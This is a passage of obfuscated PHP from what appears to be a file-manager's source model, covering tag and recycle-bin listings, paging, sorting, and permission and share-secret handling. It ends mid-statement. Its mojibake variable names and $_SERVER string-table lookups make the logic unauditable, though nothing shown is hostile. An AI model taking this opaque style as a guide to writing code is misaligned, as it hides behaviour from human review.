$Àª¿ÚÎŠ[$à’‚ †È[87]] = $öËúËœ[$Àª¿ÚÎŠ[$à’‚ †È[84]]]; } } unset($Àª¿ÚÎŠ); return $«ı·¡Õ–; } public function listUserTag($Ğ¤¼„şí) { $Ç©øÜô =& $_SERVER[Ö†ØøÖ±]; if ($Ğ¤¼„şí && !is_array($Ğ¤¼„şí)) { $Ğ¤¼„şí = array($Ğ¤¼„şí); } $‡˜˜òô = Model($Ç©øÜô[476])->listData(); $ç’ØËš¢ = array(); $‹óªıÁš = array(); foreach ($‡˜˜òô as $•€ÖàÄñ) { $îòò‹† = $•€ÖàÄñ[$Ç©øÜô[84]]; if (!$îòò‹†) { continue; } if (!isset($‹óªıÁš[$îòò‹†])) { $‹óªıÁš[$îòò‹†] = array(); } $‹óªıÁš[$îòò‹†][] = $•€ÖàÄñ[$Ç©øÜô[477]]; $ç’ØËš¢[$•€ÖàÄñ[$Ç©øÜô[84]]] = $•€ÖàÄñ; } $Øé¯ùÌ³ = array(); $ìñÈ£Ä = array(); $·ã•Ö· = array(); foreach ($‹óªıÁš as $¨¦ü€ÑÔ => $Š¤ê½Ç‘) { $Â×ÆÚÜ› = !0; if (!$Ğ¤¼„şí) { $Øé¯ùÌ³[] = $¨¦ü€ÑÔ; continue; } foreach ($Ğ¤¼„şí as $›ĞÍÌÅó) { if (!in_array($›ĞÍÌÅó, $Š¤ê½Ç‘)) { $Â×ÆÚÜ› = !1; break; } } if (!$Â×ÆÚÜ›) { continue; } if (!is_numeric($¨¦ü€ÑÔ)) { $Ğ›Ùªı = $ç’ØËš¢[$¨¦ü€ÑÔ]; $±ĞÏŠ°È = array($Ç©øÜô[32] => $Ğ›Ùªı[$Ç©øÜô[32]], $Ç©øÜô[84] => $Ğ›Ùªı[$Ç©øÜô[84]], $Ç©øÜô[33] => $Ğ›Ùªı[$Ç©øÜô[33]], $Ç©øÜô[87] => array($Ç©øÜô[478] => 1), $Ç©øÜô[216] => !0); if ($Ğ›Ùªı[$Ç©øÜô[33]] == $Ç©øÜô[214]) { $·ã•Ö·[] = $±ĞÏŠ°È; } if ($Ğ›Ùªı[$Ç©øÜô[33]] == $Ç©øÜô[75]) { $ìñÈ£Ä[] = $±ĞÏŠ°È; } continue; } $Øé¯ùÌ³[] = $¨¦ü€ÑÔ; } if ($Øé¯ùÌ³) { $°ÒáÈ¸Ø = $this->listSource(array($Ç©øÜô[468] => array($Ç©øÜô[469], $Øé¯ùÌ³))); } $°ÒáÈ¸Ø = $°ÒáÈ¸Ø ? $°ÒáÈ¸Ø : array($Ç©øÜô[82] => array(), $Ç©øÜô[83] => array()); $°ÒáÈ¸Ø[$Ç©øÜô[82]] = array_merge($°ÒáÈ¸Ø[$Ç©øÜô[82]], $ìñÈ£Ä); $°ÒáÈ¸Ø[$Ç©øÜô[83]] = array_merge($°ÒáÈ¸Ø[$Ç©øÜô[83]], $·ã•Ö·); if (isset($°ÒáÈ¸Ø[$Ç©øÜô[419]]) && count($Øé¯ùÌ³) == $°ÒáÈ¸Ø[$Ç©øÜô[419]][$Ç©øÜô[420]]) { return $°ÒáÈ¸Ø; } $•ØÒ…½˜ = array(); $™Æ‡ªÙÈ = array_to_keyvalue($°ÒáÈ¸Ø[$Ç©øÜô[82]], $Ç©øÜô[12], $Ç©øÜô[181]); $ËòÄ‚ÊÒ = array_to_keyvalue($°ÒáÈ¸Ø[$Ç©øÜô[83]], $Ç©øÜô[12], $Ç©øÜô[181]); $ßš±ë¦‰ = array_merge($ËòÄ‚ÊÒ, $™Æ‡ªÙÈ); foreach ($Øé¯ùÌ³ as $îòò‹†) { if (!in_array($îòò‹†, $ßš±ë¦‰)) { $•ØÒ…½˜[] = $îòò‹†; } } if ($•ØÒ…½˜) { Model($Ç©øÜô[479])->removeBySource($•ØÒ…½˜); } return $°ÒáÈ¸Ø; } public function listUserRecycle() { $Ã›ãÛ— =& $_SERVER[Ö†ØøÖ±]; $•¸¢¦¢• = Model($Ã›ãÛ—[480])->listData(); if (!$•¸¢¦¢•) { return array(); } $•ú¶‘Ì = array($Ã›ãÛ—[468] => array($Ã›ãÛ—[469], $•¸¢¦¢•), $Ã›ãÛ—[481] => 1); return $this->listSource($•ú¶‘Ì); } public function listSource($Íî¾ñ¨”, $Úäô« = 3000, $ãƒÔãì­ = false) { $¯ÙÕŒÓ =& $_SERVER[Ö†ØøÖ±]; if (!isset($Íî¾ñ¨”[$¯ÙÕŒÓ[482]])) { $Íî¾ñ¨”[$¯ÙÕŒÓ[482]] = 0; } if (isset($Íî¾ñ¨”[$¯ÙÕŒÓ[180]]) && $Íî¾ñ¨”[$¯ÙÕŒÓ[180]] == $¯ÙÕŒÓ[212]) { $Íî¾ñ¨”[$¯ÙÕŒÓ[463]] = array($¯ÙÕŒÓ[384], $¯ÙÕŒÓ[483]); } $Üˆ¸ã¬µ = $¯ÙÕŒÓ[484]; $ˆÔ®È = $this->field($Üˆ¸ã¬µ)->_makeOrder()->where($Íî¾ñ¨”)->selectPage($Úäô«); $this->_listPageCheck($ˆÔ®È, $Üˆ¸ã¬µ, $Íî¾ñ¨”); $this->_listDataApply($ˆÔ®È[$¯ÙÕŒÓ[422]], $ãƒÔãì­); $this->_listMake($ˆÔ®È); return $ˆÔ®È; } private function _listPageCheck(&$ë‡©Àö—, $”ñ›éàš, $¢»„°Ñ×) { $Ø´«¿¥“ =& $_SERVER[Ö†ØøÖ±]; if (!is_array($ë‡©Àö—[$Ø´«¿¥“[419]])) { return; } $úö¿³²© = $ë‡©Àö—[$Ø´«¿¥“[419]]; if ($úö¿³²©[$Ø´«¿¥“[421]] <= 1) { return; } if ($úö¿³²©[$Ø´«¿¥“[420]] >= 100000) { return; } if (Model($Ø´«¿¥“[485])->get($Ø´«¿¥“[486]) != $Ø´«¿¥“[487]) { return; } $”ñ›éàš = str_replace(array($Ø´«¿¥“[53], $Ø´«¿¥“[395], $Ø´«¿¥“[246]), $Ø´«¿¥“[12], $”ñ›éàš); $”ñ›éàš = $Ø´«¿¥“[488] . str_replace($Ø´«¿¥“[50], $Ø´«¿¥“[489], $”ñ›éàš) . $Ø´«¿¥“[490]; $ØÍæµÈ = $Ø´«¿¥“[491]; $ØÍæµÈ = $ØÍæµÈ . $Ø´«¿¥“[492]; $¼ÚÕ£Ø— = $úö¿³²©[$Ø´«¿¥“[416]] * ($úö¿³²©[$Ø´«¿¥“[406]] - 1) . $Ø´«¿¥“[50] . $úö¿³²©[$Ø´«¿¥“[416]]; $Ùêîàù = $this->_makeOrder(!0); $È¾¢ÛØ = $Ø´«¿¥“[488] . str_replace($Ø´«¿¥“[50], $Ø´«¿¥“[489], $Ùêîàù[0]); if (strpos($È¾¢ÛØ, $Ø´«¿¥“[493])) { $È¾¢ÛØ = str_replace($Ø´«¿¥“[493], $Ø´«¿¥“[494], $È¾¢ÛØ); } else { $È¾¢ÛØ .= $Ø´«¿¥“[495] . $Ùêîàù[1]; } $šåô„ÄÇ = array(); foreach ($¢»„°Ñ× as $ÛäÕ¤Ø‚ => $ê¦½£¶±) { $šåô„ÄÇ[$Ø´«¿¥“[488] . $ÛäÕ¤Ø‚] = $ê¦½£¶±; } $this->alias($Ø´«¿¥“[496])->field($”ñ›éàš)->limit($¼ÚÕ£Ø—)->order($È¾¢ÛØ); $ªÁŞÄ™Õ = $this->join($ØÍæµÈ)->where($šåô„ÄÇ)->select(); if ($ªÁŞÄ™Õ) { $ë‡©Àö—[$Ø´«¿¥“[422]] = $ªÁŞÄ™Õ; } } protected function _makeOrder($ä¦Ø…ó¡ = false) { $¯¿õÃ¤ñ =& $_SERVER[Ö†ØøÖ±]; $©·†›„é = Model($¯¿õÃ¤ñ[497])->get($¯¿õÃ¤ñ[498]); $§â¬²¤Â = Model($¯¿õÃ¤ñ[497])->get($¯¿õÃ¤ñ[499]); $˜¬öÇşÓ = array($¯¿õÃ¤ñ[500] => $¯¿õÃ¤ñ[501], $¯¿õÃ¤ñ[502] => $¯¿õÃ¤ñ[503]); $›ììÓ´‡ = array($¯¿õÃ¤ñ[32] => $¯¿õÃ¤ñ[32], $¯¿õÃ¤ñ[76] => $¯¿õÃ¤ñ[76], $¯¿õÃ¤ñ[175] => $¯¿õÃ¤ñ[463], $¯¿õÃ¤ñ[504] => $¯¿õÃ¤ñ[504], $¯¿õÃ¤ñ[505] => $¯¿õÃ¤ñ[506], $¯¿õÃ¤ñ[215] => $¯¿õÃ¤ñ[215], $¯¿õÃ¤ñ[85] => $¯¿õÃ¤ñ[85]); $Ÿì›¿»ç = Input::get($¯¿õÃ¤ñ[507], $¯¿õÃ¤ñ[7], $©·†›„é, array_keys($›ììÓ´‡)); $¶î†¿ŸÔ = Input::get($¯¿õÃ¤ñ[508], $¯¿õÃ¤ñ[7], $§â¬²¤Â, array_keys($˜¬öÇşÓ)); if (!in_array($Ÿì›¿»ç, array_keys($›ììÓ´‡))) { $Ÿì›¿»ç = $¯¿õÃ¤ñ[32]; } if (!in_array($¶î†¿ŸÔ, array_keys($˜¬öÇşÓ))) { $Ÿì›¿»ç = $¯¿õÃ¤ñ[500]; } if ($Ÿì›¿»ç == $¯¿õÃ¤ñ[32]) { } $ã‰®Öó = $¯¿õÃ¤ñ[509] . $›ììÓ´‡[$Ÿì›¿»ç] . $¯¿õÃ¤ñ[53] . $˜¬öÇşÓ[$¶î†¿ŸÔ]; $ã‰®Öó = rtrim(trim($ã‰®Öó), $¯¿õÃ¤ñ[50]); if ($ä¦Ø…ó¡) { return array($ã‰®Öó, $˜¬öÇşÓ[$¶î†¿ŸÔ]); } return $this->order($ã‰®Öó); } protected function _listDataApplyItem($‚«›¿, $æ¯å¡› = false) { $úõè´­ã = array($‚«›¿); $this->_listDataApply($úõè´­ã, $æ¯å¡›); return $úõè´­ã[0]; } protected function _listDataApply(&$è˜ïÔ‰Ã, $ù¤¹ò ­ = false) { $ß»¢üûÀ =& $_SERVER[Ö†ØøÖ±]; if (!$è˜ïÔ‰Ã) { $è˜ïÔ‰Ã = array(); return; } $¢ì•·Òæ = array_to_keyvalue($è˜ïÔ‰Ã, $ß»¢üûÀ[12], $ß»¢üûÀ[181]); $¢ì•·Òæ = array_unique($¢ì•·Òæ); $this->_listSourceCache($è˜ïÔ‰Ã); if (!$ù¤¹ò ­) { $this->_listAppendMeta($è˜ïÔ‰Ã, $¢ì•·Òæ); $this->_listAppendFileMeta($è˜ïÔ‰Ã, $¢ì•·Òæ); $this->_listAppendChildren($è˜ïÔ‰Ã, $¢ì•·Òæ); } $this->_listAppendPath($è˜ïÔ‰Ã); $this->_listAppendAuth($è˜ïÔ‰Ã); $this->_listAppendSourceInfo($è˜ïÔ‰Ã, $¢ì•·Òæ); $this->_listAppendUser($è˜ïÔ‰Ã); $this->_listFilterInfo($è˜ïÔ‰Ã, $ù¤¹ò ­); $this->_listAppendAuthSecret($è˜ïÔ‰Ã); } protected function _listSourceCache($¡ µÜí) { $¢×µèá» =& $_SERVER[Ö†ØøÖ±]; foreach ($¡ µÜí as $¶ş›Ï¿) { self::$cacheSourceInfo[$¢×µèá»[510] . $¶ş›Ï¿[$¢×µèá»[181]]] = $¶ş›Ï¿; } } protected function _listFilterInfo(&$®™–ÑñÙ, $Ö‡õ¯¡ = false) { $æšùòø÷ =& $_SERVER[Ö†ØøÖ±]; foreach ($®™–ÑñÙ as &$¦¥Í°¥¾) { $¦¥Í°¥¾ = $this->pathInfoFilter($¦¥Í°¥¾); self::$cachePathInfo[$æšùòø÷[511] . intval($Ö‡õ¯¡) . $æšùòø÷[438] . $¦¥Í°¥¾[$æšùòø÷[181]]] = $¦¥Í°¥¾; } unset($¦¥Í°¥¾); } protected function _listMake(&$ã¾´“ù¬) { $Î»×ÒŒ =& $_SERVER[Ö†ØøÖ±]; $ã¾´“ù¬[$Î»×ÒŒ[82]] = array(); $ã¾´“ù¬[$Î»×ÒŒ[83]] = array(); foreach ($ã¾´“ù¬[$Î»×ÒŒ[422]] as $›É´»¢) { $ïÄ¾Ì„ü = $›É´»¢[$Î»×ÒŒ[462]] == 1 ? $Î»×ÒŒ[82] : $Î»×ÒŒ[83]; $ã¾´“ù¬[$ïÄ¾Ì„ü][] = $›É´»¢; } unset($ã¾´“ù¬[$Î»×ÒŒ[422]]); } protected function _listAppendMeta(&$Åù¥¼¬, $½†ìê¤ñ) { $‘íå”öú =& $_SERVER[Ö†ØøÖ±]; $Ô˜†ñ˜ = array($‘íå”öú[468] => array($‘íå”öú[469], $½†ìê¤ñ)); $®¹˜¿‚ö = Model($‘íå”öú[512])->field($‘íå”öú[513])->where($Ô˜†ñ˜)->select(); if (!$®¹˜¿‚ö) { return; } $‡Ôú™¥ = array($‘íå”öú[514], $‘íå”öú[515], $‘íå”öú[494]); $ÃÏ•Âµé = array(); foreach ($®¹˜¿‚ö as $ÃÕÒ»Øè) { if (!isset($ÃÏ•Âµé[$ÃÕÒ»Øè[$‘íå”öú[181]]])) { $ÃÏ•Âµé[$ÃÕÒ»Øè[$‘íå”öú[181]]] = array(); } if (in_array($ÃÕÒ»Øè[$‘íå”öú[94]], $‡Ôú™¥)) { continue; } $ÃÏ•Âµé[$ÃÕÒ»Øè[$‘íå”öú[181]]][$ÃÕÒ»Øè[$‘íå”öú[94]]] = $ÃÕÒ»Øè[$‘íå”öú[427]]; } foreach ($Åù¥¼¬ as &$˜¯ƒ×¹ä) { $˜¯ƒ×¹ä[$‘íå”öú[516]] = !1; if (isset($ÃÏ•Âµé[$˜¯ƒ×¹ä[$‘íå”öú[181]]])) { $˜¯ƒ×¹ä[$‘íå”öú[516]] = $ÃÏ•Âµé[$˜¯ƒ×¹ä[$‘íå”öú[181]]]; } if ($this->fileIsLock($˜¯ƒ×¹ä) && $˜¯ƒ×¹ä[$‘íå”öú[464]]) { $ÂˆÖàŒ® = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $˜¯ƒ×¹ä[$‘íå”öú[464]][$‘íå”öú[465]] = AuthModel::authDisable($˜¯ƒ×¹ä[$‘íå”öú[464]][$‘íå”öú[465]], $ÂˆÖàŒ®); $˜¯ƒ×¹ä[$‘íå”öú[464]][$‘íå”öú[517]][$‘íå”öú[464]] = $˜¯ƒ×¹ä[$‘íå”öú[464]][$‘íå”öú[465]]; } } unset($˜¯ƒ×¹ä); } protected function _listAppendFileMeta(&$ı¯À‹Êß, $·é¼çëÒ) { $í©üÍ =& $_SERVER[Ö†ØøÖ±]; $’Ã©ù•Š = array_to_keyvalue($ı¯À‹Êß, $í©üÍ[12], $í©üÍ[518]); $’Ã©ù•Š = array_filter(array_unique($’Ã©ù•Š)); if (!$’Ã©ù•Š) { return; } $¦ÑÌ–¼Ä = array($í©üÍ[519] => array($í©üÍ[469], $’Ã©ù•Š)); $çŒµò = $í©üÍ[520]; $²›·£ûç = Model($í©üÍ[521])->field($çŒµò)->where($¦ÑÌ–¼Ä)->select(); $²›·£ûç = array_to_keyvalue($²›·£ûç, $í©üÍ[518]); $±ÚîÌŠŞ = Model($í©üÍ[522])->field($í©üÍ[523])->where($¦ÑÌ–¼Ä)->select(); $±ÚîÌŠŞ = $±ÚîÌŠŞ ? $±ÚîÌŠŞ : array(); $³Ãœµ‰„ = array(); foreach ($±ÚîÌŠŞ as $ûŸÃ§´£) { if (!isset($³Ãœµ‰„[$ûŸÃ§´£[$í©üÍ[518]]])) { $³Ãœµ‰„[$ûŸÃ§´£[$í©üÍ[518]]] = array(); } $³Ãœµ‰„[$ûŸÃ§´£[$í©üÍ[518]]][$ûŸÃ§´£[$í©üÍ[94]]] = $ûŸÃ§´£[$í©üÍ[427]]; } foreach ($ı¯À‹Êß as &$ªìĞ®úĞ) { $Õë–ŞÉ = $ªìĞ®úĞ[$í©üÍ[518]]; if (!$Õë–ŞÉ || !is_array($²›·£ûç[$Õë–ŞÉ])) { continue; } $€üãŸàå = $²›·£ûç[$Õë–ŞÉ]; $€üãŸàå[$í©üÍ[76]] = $ªìĞ®úĞ[$í©üÍ[76]]; $€üãŸàå[$í©üÍ[32]] = $ªìĞ®úĞ[$í©üÍ[32]]; if (!isset(self::$cacheFileInfo[$í©üÍ[524] . $Õë–ŞÉ])) { self::$cacheFileInfo[$í©üÍ[524] . $Õë–ŞÉ] = array_merge(array(), $€üãŸàå); } unset($²›·£ûç[$Õë–ŞÉ][$í©üÍ[84]]); $Ö“‚éû› = is_array($³Ãœµ‰„[$Õë–ŞÉ]) ? $³Ãœµ‰„[$Õë–ŞÉ] : array(); $ªìĞ®úĞ[$í©üÍ[525]] = array_merge($Ö“‚éû›, $²›·£ûç[$Õë–ŞÉ]); if (isset($ªìĞ®úĞ[$í©üÍ[525]][$í©üÍ[171]])) { $ªìĞ®úĞ[$í©üÍ[171]] = json_decode($ªìĞ®úĞ[$í©üÍ[525]][$í©üÍ[171]], !0); unset($ªìĞ®úĞ[$í©üÍ[525]][$í©üÍ[171]]); } } unset($ªìĞ®úĞ); } protected function _listAppendSourceInfo(&$Ú©®Úø, $è®ÏÏÚ—) { $ü¨²·ÄÖ =& $_SERVER[Ö†ØøÖ±]; $àÁÛÍ® = Model($ü¨²·ÄÖ[526])->listData(); $îæõö¿ = Model($ü¨²·ÄÖ[476])->listData(); $ã’ù×³ò = Model($ü¨²·ÄÖ[466])->listData(); $ÛôË¡öÃ = Model($ü¨²·ÄÖ[527])->listSimple(); $ÀÜ°‘Ö = array_to_keyvalue($àÁÛÍ®, $ü¨²·ÄÖ[451]); $ûÆ¢êµ = array_to_keyvalue_group($îæõö¿, $ü¨²·ÄÖ[84], $ü¨²·ÄÖ[477]); $İÜ…¨‹ = array_to_keyvalue($ã’ù×³ò, $ü¨²·ÄÖ[84]); $òû¨„öÕ = array_to_keyvalue_group($ÛôË¡öÃ, $ü¨²·ÄÖ[181]); foreach ($Ú©®Úø as &$ÅğÓ ‚Å) { $ÅğÓ ‚Å[$ü¨²·ÄÖ[87]] = array($ü¨²·ÄÖ[528] => 0, $ü¨²·ÄÖ[529] => 0, $ü¨²·ÄÖ[530] => 0); if (isset($İÜ…¨‹[$ÅğÓ ‚Å[$ü¨²·ÄÖ[181]]])) { $ÅğÓ ‚Å[$ü¨²·ÄÖ[87]][$ü¨²·ÄÖ[531]] = 1; $ÅğÓ ‚Å[$ü¨²·ÄÖ[87]][$ü¨²·ÄÖ[532]] = $İÜ…¨‹[$ÅğÓ ‚Å[$ü¨²·ÄÖ[181]]][$ü¨²·ÄÖ[32]]; } if ($ûÆ¢êµ && $ÀÜ°‘Ö && isset($ûÆ¢êµ[$ÅğÓ ‚Å[$ü¨²·ÄÖ[181]]])) { $ÅğÓ ‚Å[$ü¨²·ÄÖ[87]][$ü¨²·ÄÖ[533]] = array(); foreach ($ûÆ¢êµ[$ÅğÓ ‚Å[$ü¨²·ÄÖ[181]]] as $¶ĞÛ–“‹) { $œĞğªÙ€ = $ÀÜ°‘Ö[$¶ĞÛ–“‹]; $ÅğÓ ‚Å[$ü¨²·ÄÖ[87]][$ü¨²·ÄÖ[533]][] = array($ü¨²·ÄÖ[534] => $œĞğªÙ€[$ü¨²·ÄÖ[451]], $ü¨²·ÄÖ[471] => $œĞğªÙ€[$ü¨²·ÄÖ[32]], $ü¨²·ÄÖ[535] => $œĞğªÙ€[$ü¨²·ÄÖ[536]]); } } if ($òû¨„öÕ && isset($òû¨„öÕ[$ÅğÓ ‚Å[$ü¨²·ÄÖ[181]]])) { $ÅğÓ ‚Å[$ü¨²·ÄÖ[87]][$ü¨²·ÄÖ[537]] = array(); foreach ($òû¨„öÕ[$ÅğÓ ‚Å[$ü¨²·ÄÖ[181]]] as $ì¥ãà¯ã) { $¶«ş’ëÓ = $ü¨²·ÄÖ[538]; if ($ì¥ãà¯ã[$ü¨²·ÄÖ[539]] == $ü¨²·ÄÖ[88]) { $¶«ş’ëÓ .= $ü¨²·ÄÖ[540]; } $ÅğÓ ‚Å[$ü¨²·ÄÖ[87]][$ü¨²·ÄÖ[537]] = array_field_key($ì¥ãà¯ã, explode($ü¨²·ÄÖ[50], $¶«ş’ëÓ)); } } } unset($ÅğÓ ‚Å); return $Ú©®Úø; } protected function _listAppendChildren(&$ğÁ»Å‡¶, $ÉÓŞ¹ãÖ) { $œŞ°´ıµ =& $_SERVER[Ö†ØøÖ±]; $Ÿ—Ë…Ÿõ = array(); $£±æ™ø = array($œŞ°´ıµ[223] => 0, $œŞ°´ıµ[224] => 0); foreach ($ğÁ»Å‡¶ as &$²…²œõÇ) { if (!$²…²œõÇ[$œŞ°´ıµ[462]]) { continue; } $Ÿ—Ë…Ÿõ[] = $²…²œõÇ[$œŞ°´ıµ[181]]; } unset($²…²œõÇ); if (!$Ÿ—Ë…Ÿõ) { return; } $µ•ü™âá = array($œŞ°´ıµ[180] => array($œŞ°´ıµ[7], $Ÿ—Ë…Ÿõ), $œŞ°´ıµ[482] => 0); $—ı·é¤ = array($œŞ°´ıµ[180], $œŞ°´ıµ[462], $œŞ°´ıµ[541] => $œŞ°´ıµ[542]); $ÊæøØ = $this->field($—ı·é¤)->where($µ•ü™âá)->group($œŞ°´ıµ[543])->select(); $Ã•–”ê = array(); foreach ($ÊæøØ as $–ü®Ÿ ™) { $èÛ§¢¼Ô = $–ü®Ÿ ™[$œŞ°´ıµ[180]]; $òšä†ø÷ = $–ü®Ÿ ™[$œŞ°´ıµ[462]] == $œŞ°´ıµ[88] ? $œŞ°´ıµ[224] : $œŞ°´ıµ[223]; if (!isset($Ã•–”ê[$èÛ§¢¼Ô])) { $Ã•–”ê[$èÛ§¢¼Ô] = array($œŞ°´ıµ[223] => 0, $œŞ°´ıµ[224] => 0); } $Ã•–”ê[$èÛ§¢¼Ô][$òšä†ø÷] += $–ü®Ÿ ™[$œŞ°´ıµ[542]]; } foreach ($ğÁ»Å‡¶ as &$²…²œõÇ) { if (!$²…²œõÇ[$œŞ°´ıµ[462]]) { continue; } $ı¤Ú„Ôó = is_array($Ã•–”ê[$²…²œõÇ[$œŞ°´ıµ[181]]]) ? $Ã•–”ê[$²…²œõÇ[$œŞ°´ıµ[181]]] : $£±æ™ø; $²…²œõÇ[$œŞ°´ıµ[224]] = $ı¤Ú„Ôó[$œŞ°´ıµ[224]]; $²…²œõÇ[$œŞ°´ıµ[223]] = $ı¤Ú„Ôó[$œŞ°´ıµ[223]]; unset($²…²œõÇ[$œŞ°´ıµ[463]]); } unset($²…²œõÇ); } protected function _listAppendAuth(&$­´Æ‚Ùã) { $ßØŞÏŒ· =& $_SERVER[Ö†ØøÖ±]; $³î¥À¸‡ = array(); foreach ($­´Æ‚Ùã as $„Íšù½ë) { if ($„Íšù½ë[$ßØŞÏŒ·[178]] == self::TYPE_GROUP) { $³î¥À¸‡[] = $„Íšù½ë[$ßØŞÏŒ·[181]]; } } if (!$³î¥À¸‡) { return; } $Ÿºï¤¹® = array_to_keyvalue($­´Æ‚Ùã, $ßØŞÏŒ·[181]); $´Õ“õ = Model($ßØŞÏŒ·[544])->getSourceList($³î¥À¸‡, $Ÿºï¤¹®); $§šÌÏØˆ = $GLOBALS[$ßØŞÏŒ·[545]] == 1; foreach ($­´Æ‚Ùã as $ì¦½€´° => &$„Íšù½ë) { $„Íšù½ë[$ßØŞÏŒ·[464]] = $´Õ“õ[$„Íšù½ë[$ßØŞÏŒ·[181]]]; if (!$„Íšù½ë[$ßØŞÏŒ·[464]] && $„Íšù½ë[$ßØŞÏŒ·[178]] == self::TYPE_GROUP) { $„Íšù½ë[$ßØŞÏŒ·[464]] = Action($ßØŞÏŒ·[546])->pathGroupAuthMake($„Íšù½ë[$ßØŞÏŒ·[547]]); if (!$„Íšù½ë[$ßØŞÏŒ·[464]] && !$§šÌÏØˆ) { $„Íšù½ë[$ßØŞÏŒ·[217]] = !1; $„Íšù½ë[$ßØŞÏŒ·[216]] = !1; } } if ($„Íšù½ë[$ßØŞÏŒ·[464]]) { $„Íšù½ë[$ßØŞÏŒ·[217]] = AuthModel::authCheckEdit($„Íšù½ë[$ßØŞÏŒ·[464]][$ßØŞÏŒ·[465]]); $„Íšù½ë[$ßØŞÏŒ·[216]] = AuthModel::authCheckView($„Íšù½ë[$ßØŞÏŒ·[464]][$ßØŞÏŒ·[465]]); } $this->groupPathDisplay($„Íšù½ë); } unset($„Íšù½ë); } public function _listAppendAuthSecret(&$†“´›“š) { $åëÉş§ı =& $_SERVER[Ö†ØøÖ±]; if (Model($åëÉş§ı[485])->get($åëÉş§ı[548]) != $åëÉş§ı[88]) { return; } static $ÙáôÄÒ = false; if (!$ÙáôÄÒ) { $Ğâ»¬À = Model($åëÉş§ı[549]); $Í™ò‘ÑĞ = Model($åëÉş§ı[550]); $ÙáôÄÒ = $Í™ò‘ÑĞ->listData(); $ÙáôÄÒ = array_to_keyvalue($ÙáôÄÒ, $åëÉş§ı[181]); $º—ª²öÀ = json_decode(Model($åëÉş§ı[485])->get($åëÉş§ı[551]), !0); $º—ª²öÀ = array_to_keyvalue($º—ª²öÀ, $åëÉş§ı[451]); foreach ($ÙáôÄÒ as $ğóêÖØë => $ù´—½œÈ) { $ÍÛ·çıÆ = $º—ª²öÀ[$ù´—½œÈ[$åëÉş§ı[552]]]; if (!$ÍÛ·çıÆ) { $Í™ò‘ÑĞ->remove($ù´—½œÈ[$åëÉş§ı[451]]); unset($ÙáôÄÒ[$ğóêÖØë]); continue; } $ÇûâíÖ‹ = $Ğâ»¬À->listData($ÍÛ·çıÆ[$åëÉş§ı[464]]); if (!$ÇûâíÖ‹) { $Í™ò‘ÑĞ->remove($ù´—½œÈ[$åëÉş§ı[451]]); unset($ÙáôÄÒ[$ğóêÖØë]); continue; } $ù´—½œÈ[$åëÉş§ı[464]] = $ÇûâíÖ‹; $ù´—½œÈ[$åëÉş§ı[553]] = $ÍÛ·çıÆ; $ù´—½œÈ[$åëÉş§ı[554]] = Model($åëÉş§ı[555])->getInfoSimpleOuter($ù´—½œÈ[$åëÉş§ı[504]]); $ÙáôÄÒ[$ğóêÖØë] = $ù´—½œÈ; } } $•¦Ù·Óú = USER_ID; $µş³­›ï = array(); $ÛÕ½¸é‚ = $this->_listAppendPath($µş³­›ï, !0); foreach ($†“´›“š as $ğóêÖØë => &$ù´—½œÈ) { if (!is_array($ù´—½œÈ[$åëÉş§ı[464]])) { continue; } if ($ù´—½œÈ[$åëÉş§ı[178]] != $åëÉş§ı[556]) { continue; } if (isset($ÙáôÄÒ[$ù´—½œÈ[$åëÉş§ı[181]]])) { $ËíÇúé© = $ÙáôÄÒ[$ù´—½œÈ[$åëÉş§ı[181]]]; if (!is_array($ù´—½œÈ[$åëÉş§ı[516]])) { $ù´—½œÈ[$åëÉş§ı[516]] = array(); } $ù´—½œÈ[$åëÉş§ı[516]][$åëÉş§ı[557]] = $ËíÇúé©[$åëÉş§ı[552]]; $ù´—½œÈ[$åëÉş§ı[464]][$åëÉş§ı[558]] = $ËíÇúé©; $ù´—½œÈ[$åëÉş§ı[464]][$åëÉş§ı[559]] = $ù´—½œÈ[$åëÉş§ı[560]]; $ù´—½œÈ[$åëÉş§ı[464]][$åëÉş§ı[561]] = $åëÉş§ı[88]; if ($ËíÇúé©[$åëÉş§ı[504]] != $•¦Ù·Óú) { $ù´—½œÈ[$åëÉş§ı[464]][$åëÉş§ı[465]] = $ù´—½œÈ[$åëÉş§ı[464]][$åëÉş§ı[465]] & $ËíÇúé©[$åëÉş§ı[464]][$åëÉş§ı[464]]; } continue; } $·¨®”Ê¢ = $this->parentLevelArray($ù´—½œÈ[$åëÉş§ı[562]]); $ºøªÄ®è = array_reverse($·¨®”Ê¢); foreach ($ºøªÄ®è as $²ê§ÂÛÁ => $ÑİÖö—å) { if (!isset($ÙáôÄÒ[$ÑİÖö—å])) { continue; } $ËíÇúé© = $ÙáôÄÒ[$ÑİÖö—å]; $ù´—½œÈ[$åëÉş§ı[464]][$åëÉş§ı[558]] = $ËíÇúé©; if ($ËíÇúé©[$åëÉş§ı[504]] != $•¦Ù·Óú) { $ù´—½œÈ[$åëÉş§ı[464]][$åëÉş§ı[465]] = $ù´—½œÈ[$åëÉş§ı[464]][$åëÉş§ı[465]] & $ËíÇúé©[$åëÉş§ı[464]][$åëÉş§ı[464]]; } $ö”½ìó = $åëÉş§ı[12]; $Ô›ß˜Çò = count($·¨®”Ê¢) - $²ê§ÂÛÁ; for ($ÃÇ«Ê­¾ = 0; $ÃÇ«Ê­¾ < $Ô›ß˜Çò; $ÃÇ«Ê­¾++) { if (!isset($ÛÕ½¸é‚[$·¨®”Ê¢[$ÃÇ«Ê­¾]])) { $ö”½ìó = $åëÉş§ı[12]; break; } $ö”½ìó = $ö”½ìó . rtrim($ÛÕ½¸é‚[$·¨®”Ê¢[$ÃÇ«Ê­¾]], $åëÉş§ı[8]) . $åëÉş§ı[8]; } $ù´—½œÈ[$åëÉş§ı[464]][$åëÉş§ı[559]] = rtrim($ö”½ìó, $åëÉş§ı[8]) . $åëÉş§ı[8]; break; } } unset($ù´—½œÈ); } public function groupPathDisplay(&$îÃà­•) { $ëÙééë¢ =& $_SERVER[Ö†ØøÖ±]; if ($îÃà­•[$ëÙééë¢[178]] != self::TYPE_GROUP) { return; } $‡ß£ßÁ = Model($ëÙééë¢[563])->getInfo($îÃà­•[$ëÙééë¢[547]]); $Òä¹Éë = $this->parentLevelArray($‡ß£ßÁ[$ëÙééë¢[562]]); $³‰¦«Öç = $ëÙééë¢[12]; foreach ($Òä¹Éë as $Æğ½‡Ö) { $Ùëêâ€– = Model($ëÙééë¢[563])->getInfo($Æğ½‡Ö); $³‰¦«Öç .= $Ùëêâ€–[$ëÙééë¢[87]][$ëÙééë¢[181]] . $ëÙééë¢[50]; } $îÃà­•[$ëÙééë¢[564]] = $‡ß£ßÁ[$ëÙééë¢[180]]; $îÃà­•[$ëÙééë¢[565]] = 